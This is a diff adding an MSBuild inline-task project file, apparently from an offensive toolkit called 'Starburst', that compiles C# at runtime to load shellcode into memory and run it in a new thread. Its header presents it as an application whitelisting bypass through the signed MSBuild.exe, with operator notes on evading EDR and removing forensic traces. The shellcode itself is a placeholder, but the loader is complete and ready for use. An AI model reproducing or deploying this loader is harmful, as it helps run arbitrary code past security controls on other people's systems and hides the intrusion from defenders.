@@ -1,0 +1,149 @@
+<!-- ======================================================================
+     Starburst MSBuild Inline Task - Application Whitelisting Bypass
+     ======================================================================
+     Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe inline_task.xml
+     Technique:  MSBuild inline C# task executes shellcode via VirtualAlloc
+     OPSEC Notes:
+       - MSBuild.exe is a Microsoft-signed binary typically allowed by
+         application whitelisting (AppLocker, WDAC).
+       - The inline task compiles and executes C# code at runtime.
+       - MSBuild.exe loading clr.dll and compiling code is observable.
+       - The XML file on disk is a forensic artifact — clean up after use.
+       - Parent process will be MSBuild.exe, which may be unusual for the
+         environment.
+       - ETW events for .NET JIT compilation will be generated.
+       - Some EDR products now specifically monitor MSBuild inline tasks.
+       - Use Framework64 path for x64 shellcode, Framework for x86.
+     ====================================================================== -->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="StarburstLoader">
+    <StarburstTask />
+  </Target>
+  <UsingTask
+    TaskName="StarburstTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.Runtime.InteropServices" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class StarburstTask : Task
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAlloc(
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flAllocationType,
+        uint flProtect
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr CreateThread(
+        IntPtr lpThreadAttributes,
+        uint dwStackSize,
+        IntPtr lpStartAddress,
+        IntPtr lpParameter,
+        uint dwCreationFlags,
+        out uint lpThreadId
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern uint WaitForSingleObject(
+        IntPtr hHandle,
+        uint dwMilliseconds
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint PAGE_READWRITE = 0x04;
+    const uint PAGE_EXECUTE_READ = 0x20;
+    const uint INFINITE = 0xFFFFFFFF;
+
+    public override bool Execute()
+    {
+        // --- OPERATOR: Choose one shellcode source ---
+
+        // OPTION A: Embedded shellcode byte array
+        // Replace these bytes with your Starburst shellcode
+        byte[] shellcode = new byte[] {
+            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
+        };
+
+        // OPTION B: Read shellcode from file (uncomment below, comment out Option A)
+        // string scPath = @"C:\path\to\starburst.bin";
+        // byte[] shellcode = File.ReadAllBytes(scPath);
+
+        // Allocate RW memory
+        IntPtr address = VirtualAlloc(
+            IntPtr.Zero,
+            (uint)shellcode.Length,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+
+        if (address == IntPtr.Zero)
+        {
+            return false;
+        }
+
+        // Copy shellcode to allocated memory
+        Marshal.Copy(shellcode, 0, address, shellcode.Length);
+
+        // Clear shellcode from managed memory
+        Array.Clear(shellcode, 0, shellcode.Length);
+
+        // Flip memory protection from RW to RX
+        uint oldProtect;
+        if (!VirtualProtect(address, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect))
+        {
+            return false;
+        }
+
+        // Create thread at shellcode address
+        uint threadId;
+        IntPtr threadHandle = CreateThread(
+            IntPtr.Zero,
+            0,
+            address,
+            IntPtr.Zero,
+            0,
+            out threadId
+        );
+
+        if (threadHandle == IntPtr.Zero)
+        {
+            return false;
+        }
+
+        // Wait for thread to complete
+        WaitForSingleObject(threadHandle, INFINITE);
+        CloseHandle(threadHandle);
+
+        return true;
+    }
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
